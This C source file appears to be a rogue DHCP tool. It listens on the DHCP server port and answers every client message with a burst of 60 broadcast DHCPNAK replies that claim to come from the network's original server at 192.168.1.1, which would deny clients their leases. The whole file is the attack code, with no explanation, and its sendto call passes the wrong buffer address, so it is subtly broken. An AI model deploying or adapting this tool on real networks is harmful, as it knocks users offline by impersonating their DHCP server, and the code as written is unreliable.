#define _POSIX_C_SOURCE 199309L

#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <signal.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

enum {
    dhcp_server_port =  67,
    dhcp_client_port =  68,

    dhcp_chaddr_len =   16,
    dhcp_sname_len =    64,
    dhcp_filename_len = 128,
    dhcp_options_len =  312,

    orig_dhcp_ip_1 =    192,
    orig_dhcp_ip_2 =    168,
    orig_dhcp_ip_3 =    1,
    orig_dhcp_ip_4 =    1
};

#define ORIG_DHCP_IP (orig_dhcp_ip_1 | (orig_dhcp_ip_2 << 8) | (orig_dhcp_ip_3 << 16) | (orig_dhcp_ip_4 << 24))

struct dhcp_msg {
    uint8_t opcode;
    uint8_t htype;
    uint8_t hlen;
    uint8_t hops;
    uint32_t xid;
    uint16_t secs;
    uint16_t flags;
    uint32_t ciaddr;
    uint32_t yiaddr;
    uint32_t siaddr;
    uint32_t giaddr;
    uint8_t chaddr[dhcp_chaddr_len];
    char sname[dhcp_sname_len];
    char filename[dhcp_filename_len];
    uint32_t cookie;
    uint8_t options[dhcp_options_len];
} __attribute__((__packed__));

void dhcp_handle(int socket_fd, struct dhcp_msg *msg, struct sockaddr_in *client_addr);

int main(void) {
    int socket_fd;
    int sockopt;
    struct sockaddr_in serv_addr;
    struct sockaddr_in client_addr;
    socklen_t client_addr_len;
    ssize_t msg_len;
    struct dhcp_msg msg;
    int pid;

    if((socket_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) { 
        perror("socket()"); 
        exit(EXIT_FAILURE); 
    }

    sockopt = 1;
    if(setsockopt(socket_fd, SOL_SOCKET, SO_BROADCAST, &sockopt, sizeof(sockopt)) < 0) {
        perror("setsockopt()");
        exit(EXIT_FAILURE);
    }

    memset(&serv_addr, 0, sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(dhcp_server_port);

    if(bind(socket_fd, (const struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        perror("bind()");
        exit(EXIT_FAILURE);
    }

    client_addr_len = sizeof(client_addr);
    pid = 0;

    while((msg_len = recvfrom(socket_fd, &msg, sizeof(msg), 0, (struct sockaddr *) &client_addr, &client_addr_len)) > 0) {
        if(msg_len < sizeof(msg) - dhcp_options_len) {
            printf("Received incomplete message on DHCP port\n");
            continue;
        }

        /*printf("DHCP message from %s\n", inet_ntoa(client_addr.sin_addr));
        printf("|-opcode: %d\n", msg.opcode);
        printf("|-xid: %x\n", ntohl(msg.xid));
        if(msg.hlen == 6) {
            printf("|-chaddr: %x:%x:%x:%x:%x:%x\n", msg.chaddr[0], msg.chaddr[1], msg.chaddr[2], msg.chaddr[3], msg.chaddr[4], msg.chaddr[5]);
        }
        printf("|-sname: %s\n", msg.sname);
        printf("|-filename: %s\n", msg.filename);
        printf("\n");*/

        if(pid != 0) {
            kill(pid, SIGTERM);
        }

        if((pid = fork()) < 0) {
            perror("fork()");
            exit(EXIT_FAILURE);
        }

        if(pid != 0) {
            continue;
        }

        dhcp_handle(socket_fd, &msg, &client_addr);

        exit(EXIT_SUCCESS);
    }

    return EXIT_SUCCESS;
}

void dhcp_handle(int socket_fd, struct dhcp_msg *msg, struct sockaddr_in *client_addr) {
    msg->opcode = 2;
    msg->ciaddr = 0;
    msg->yiaddr = 0;
    msg->siaddr = 0;
    msg->giaddr = 0;

    memset(&msg->options, 0, dhcp_options_len * sizeof(uint8_t));

    msg->options[0] = 53;
    msg->options[1] = 1;
    msg->options[2] = 6;

    msg->options[3] = 54;
    msg->options[4] = 4;
    msg->options[5] = orig_dhcp_ip_1;
    msg->options[6] = orig_dhcp_ip_2;
    msg->options[7] = orig_dhcp_ip_3;
    msg->options[8] = orig_dhcp_ip_4;

    msg->options[9] = 56;
    msg->options[10] = 5;
    msg->options[11] = 123;
    msg->options[12] = 124;
    msg->options[13] = 125;
    msg->options[14] = 126;
    msg->options[15] = 127;

    msg->options[16] = 255;

    client_addr->sin_family = AF_INET;
    client_addr->sin_addr.s_addr = htonl(INADDR_BROADCAST);
    client_addr->sin_port = htons(dhcp_client_port);

    for(int i = 0; i < 60; i++) {
        if(sendto(socket_fd, &msg, sizeof(struct dhcp_msg) - dhcp_options_len + 17, 0, (struct sockaddr *) client_addr, sizeof(struct sockaddr_in)) < 0) {
            perror("sendto()");
            exit(EXIT_FAILURE);
        }

        struct timespec ts;
        ts.tv_sec = 0;
        ts.tv_nsec = 1 * 1000000;
        nanosleep(&ts, &ts);
    }
}
